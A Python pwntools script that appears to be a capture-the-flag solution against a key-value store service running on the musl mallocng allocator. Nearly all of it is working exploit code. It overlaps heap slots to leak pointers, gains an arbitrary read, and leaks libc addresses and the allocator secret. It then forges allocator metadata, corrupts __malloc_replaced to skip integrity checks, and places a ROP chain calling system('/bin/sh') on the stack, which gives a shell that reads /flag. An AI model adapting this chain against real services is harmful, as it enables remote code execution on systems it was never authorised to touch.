#!/usr/bin/python3
from pwn import *
import sys, binascii

MAGIC = 'VqkuA', 'UUbtx'

class PartialString(object):
    def __init__(self, s, n):
        self.raw = s
        self.len = n

    def __len__(self):
        return self.len

def hash(s, m=0xffffffff):
    if isinstance(s, str):
        s = s.encode('utf-8')
    # print(list(s))
    h = 2021
    for c in s:
        h = h * 0x13377331 + c
        h &= m
    return h

def exploit(host, port):
    r = remote(host, port)

    def store(k, v, pwned=False):
        r.recvuntil('option: ')
        r.sendline('1')
        r.recvuntil('size: ')
        r.sendline(str(len(k)))
        r.recvuntil('content: ')
        r.send(str(k))
        r.recvuntil('size: ')
        r.sendline(str(len(v)))
        r.recvuntil('content: ')
        if isinstance(v, PartialString):
            r.send(v.raw)
        elif isinstance(v, bytes):
            r.send(v)
        else:
            r.send(str(v))
        if not pwned:
            return r.recvline() # ok or err

    def query(k):
        r.recvuntil('option: ')
        r.sendline('2')
        r.recvuntil('size: ')
        r.sendline(str(len(k)))
        r.recvuntil('content: ')
        r.send(str(k))
        d = r.recvline().strip()
        v = d.split(b':')
        if len(v) == 2:
            return binascii.unhexlify(v[1])
        else:
            return None

    def delete(k):
        r.recvuntil('option: ')
        r.sendline('3')
        r.recvuntil('size: ')
        r.sendline(str(len(k)))
        r.recvuntil('content: ')
        r.send(str(k))
        return r.recvline() # ok or err

    # create 2 groups 7 + 6
    for i in range(13):
        store(str(i), str(i))
    # delete slot 6 in group 0 (g0s6)
    delete('6')
    # node at g1s6, value at g0s6
    store(MAGIC[0], 'A' * 0x30)
    # create 1 group, node at g2s0
    store(MAGIC[1], 'BBB')
    # delete g0s6, g1s6
    delete(MAGIC[0])
    # delete g2s0, destroy group 2
    delete(MAGIC[1])
    # node at g0s6 (overlap with MAGIC[0]'s value)
    store(MAGIC[1] + 'x', 'x')
    leak = query(MAGIC[0])
    ptr = u64(leak[:8])
    ptr_offset = 0x8e00
    bss = ptr - ptr_offset
    text = bss - 0x4000
    print('heap ptr %#x bss %#x text %#x' % (ptr, bss, text))

    def read(addr, size):
        # delete g1s0
        delete('7')
        node = b''.join(map(p64, [ptr, addr, len(MAGIC[1]), size, hash(MAGIC[1]), 0]))
        assert b'\n' not in node
        store('7', node)
        return query(MAGIC[1])

    dd = read(bss, 0x9000)
    # get meta
    offset = u16(dd[ptr_offset - 2:ptr_offset])
    meta = u64(dd[ptr_offset - 0x10 - offset * 0x10:ptr_offset - 0x10 - offset * 0x10 + 8])
    area = meta & ~0xfff
    print('meta %#x area %#x' % (meta, area))
    secret = u64(read(area, 8))
    print('secret %#x' % secret)
    puts_got = text + 0x3f90
    puts = u64(read(puts_got, 8))
    libc = puts - 0x60c10
    system = libc + 0x50a90
    bin_sh = libc + 0xb21d7
    pop_rdi = libc + 0x52ec4
    environ = libc + 0xb6d20
    envp = u64(read(environ, 8))
    __malloc_replaced = libc + 0xb6f84
    print('puts %#x libc %#x system %#x envp %#x __malloc_replaced %#x' % (puts, libc, system, envp, __malloc_replaced))

    # create fake meta area at aligned address
    delete('0')
    store('meta', PartialString('1\n', 0x1ffec))
    meta_node = u64(read(bss + 0x40 + 8 * (hash(b'meta') & 0xfff), 8))
    print('meta node %#x' % meta_node)
    meta_content = u64(read(meta_node + 8, 8))
    print('meta content %#x' % meta_content)
    delete('meta')

    assert (meta_content & 0xfff) == 0x10
    mem_addr = meta_content + 0x200
    meta_addr = (meta_content + 0xff0) + 0x18
    meta = p64(0) * 2 + p64(mem_addr) + p32(0) + p32(0) + p64(0 | (0 << 5) | (6 << 6) | (0 << 12))
    meta_area = p64(secret) + p64(0) + p64(1)
    content = b'X' * 0x200 + p64(meta_addr) + b''.join(map(p8, [0, 0, 0, 0, 0, 0, 0, 0])) + MAGIC[0].encode('utf-8').ljust(0xde0, b'\0') + meta_area + meta
    assert b'\n' not in content
    store('meta', PartialString(content + b'\n', 0x1ffec))

    # make a fake node to free
    delete('7')
    node = b''.join(map(p64, [mem_addr + 0x10, 0, len(MAGIC[0]), 0, hash(MAGIC[0]), 0]))
    assert b'\a' not in node
    store('7', node)

    delete(MAGIC[0])

    # corrupt __malloc_replaced to skip get_meta check
    assert __malloc_replaced % 8 == 4
    meta = p64(meta_addr) * 2 + p64(__malloc_replaced - 0x10 + 4) + p32(1) + p32(0) + p64(0 | (0 << 5) | (6 << 6) | (0 << 12))
    content = b'\0' * 0xff0 + meta_area + meta
    assert b'\n' not in content
    delete('meta')
    store('meta', PartialString(content + b'\n', 0x1ffec))
    delete('8')
    store('8', b'M' * 0x60)

    stack = envp - 0xc0
    meta = p64(meta_addr) * 2 + p64(stack - 0x10 + 8) + p32(1) + p32(0) + p64(0 | (0 << 5) | (6 << 6) | (0 << 12))
    content = b'\0' * 0xff0 + meta_area + meta
    assert b'\n' not in content
    delete('meta')
    store('meta', PartialString(content + b'\n', 0x1ffec))
    rop = b'S' * 8 + b''.join(map(p64, [pop_rdi, bin_sh, system]))
    store('pwn', rop.ljust(0x5f, b'\0') + b'\n', pwned=True)

    r.sendline('\n\ncat /flag; exit\n')
    print(r.recvall())

if __name__ == '__main__':
    for i in range(10):
        try:
            exploit(sys.argv[1], int(sys.argv[2]))
            break
        except Exception:
            pass

